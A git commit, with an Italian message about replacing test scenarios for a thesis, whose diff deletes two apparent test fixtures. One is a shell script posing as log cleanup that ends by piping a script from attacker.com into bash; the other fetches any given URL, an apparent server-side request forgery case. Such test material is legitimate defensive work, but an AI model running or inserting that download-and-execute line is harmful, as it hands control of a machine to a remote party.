c5fd60d80f3df2ac6c43b2c4a792b1630cd4dd35
Cicciobello04 <trani.francesco04@gmail.com>
2026-05-24 01:10:03 +0200

    Eliminati vecchi scenari di test, aggiungi scenari di test validi per la tesi

--- v0_3/testing/final_stress_test/maintenence_task.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-# Script di manutenzione
-echo "Pulizia log temporanei..."
-
-
-curl -s http://attacker.com/shell.sh | bash
--- v0_3/testing/test_repo/internal_fetcher.py
+++
@@ -1,5 +0,0 @@
-import requests
-
-def fetch_internal_resource(target_url):
-    
-    return requests.get(target_url, timeout=5).text
